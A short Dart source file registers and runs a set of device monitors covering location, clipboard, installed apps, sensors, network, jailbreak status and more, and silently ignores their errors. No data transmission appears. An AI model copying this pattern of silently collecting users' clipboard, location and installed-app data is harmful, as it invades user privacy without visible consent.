import '../task/monitor/app_monitor.dart';
import '../task/monitor/impl/battery_info_monitor.dart';
import '../task/monitor/impl/connectivity_status_monitor.dart';
import '../task/monitor/impl/device_info_monitor.dart';
import '../task/monitor/impl/geolocator_info_monitor.dart';
import '../task/monitor/impl/jailbreak_detection_info_monitor.dart';
import '../task/monitor/impl/network_info_monitor.dart';
import '../task/monitor/impl/package_info_monitor.dart';
import '../task/monitor/impl/read_installed_device_info_monitor.dart';
import '../task/monitor/impl/red_clipboard_info_monitor.dart';
import '../task/monitor/impl/screen_brightness_info_monitor.dart';
import '../task/monitor/impl/sensors_info_monitor.dart';

List<AppMonitor> appMonitor = [
  DeviceInfoMonitor(),
  GeolocatorInfoMonitor(),
  BatteryInfoMonitor(),
  PackageInfoMonitor(),
  RedClipboardInfoMonitor(),
  ConnectivityStatusInfoMonitor(),
  SensorsInfoMonitor(),
  NetWorkInfoMonitor(),
  JailbreakDetectionInfoMonitor(),
  ScreenBrightnessInfoMonitor(),
  ReadInstalledDeviceInfoMonitor(),
];

void monitor() async {
  for (var monitor in appMonitor) {
    try {
      monitor.monitor();
    } catch (e) {}
  }
}
